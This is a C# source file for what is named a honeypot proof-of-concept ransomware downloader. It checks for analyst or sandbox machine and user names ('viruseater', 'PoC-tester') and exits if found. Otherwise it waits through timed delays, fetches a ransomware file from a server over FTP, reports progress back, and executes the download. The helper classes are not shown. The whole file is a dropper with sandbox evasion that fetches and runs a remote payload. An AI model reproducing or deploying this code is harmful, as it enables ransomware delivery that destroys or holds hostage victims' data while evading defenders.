using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace HoneyPotPOCRansomwareDownloader
{
    class Program
    {
        static void Main(string[] args)
        {
            ransomwareDownload();
        }

        public static void ransomwareDownload()
        {
            if (Environment.MachineName.Contains("viruseater")) return;
            if (Environment.UserName.Contains("viruseater")) return;
            if (Environment.UserName.Contains("PoC-tester")) return;
            Thread.Sleep(2000);
            serverCommunicator.setRansomwareFilePath();
            serverCommunicator.getPoCRansomware();
            Console.WriteLine(serverCommunicator.getNAMEONTEST());
            Thread.Sleep(10000);
            //Install ransomware

            serverCommunicator.postPoCTaken();

            Thread.Sleep(5000);

            serverCommunicator.downloadFileFTP();

            Thread.Sleep(8000);

            serverCommunicator.postPoCFetched();

            Thread.Sleep(120000);

            programExecuter.executeProgram(serverCommunicator.getRansomwareFilePath());


            //Play ransomware
        }
    }
}
